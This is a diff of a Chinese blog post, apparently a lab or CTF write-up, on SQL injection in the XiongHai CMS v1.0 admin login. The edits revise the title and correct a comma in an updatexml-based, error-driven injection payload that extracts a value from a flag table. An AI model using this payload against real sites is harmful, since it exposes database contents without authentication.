@@ -1,5 +1,5 @@
 ---
-title: "熊海 CMS 后台登录的 SQL 注入"
+title: "熊海 CMS v1.0 后台登录存在 SQL 注入"
 date: 2024-02-12
 description: "管理员登录页面可以在不登录的情况下对 POST 的表单做 SQL 注入，利用语法报错泄露数据库信息"
 tags: ["SQL注入","后端漏洞"]
@@ -35,7 +35,7 @@ extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串�
     1' and updatexml(1,concat(
         0x5c,
         0x7e,
-        (select value from flag_db.flag limit 0,1)，
+        (select value from flag_db.flag limit 0,1),
         0x7e
     ),1) and '1'='1
 
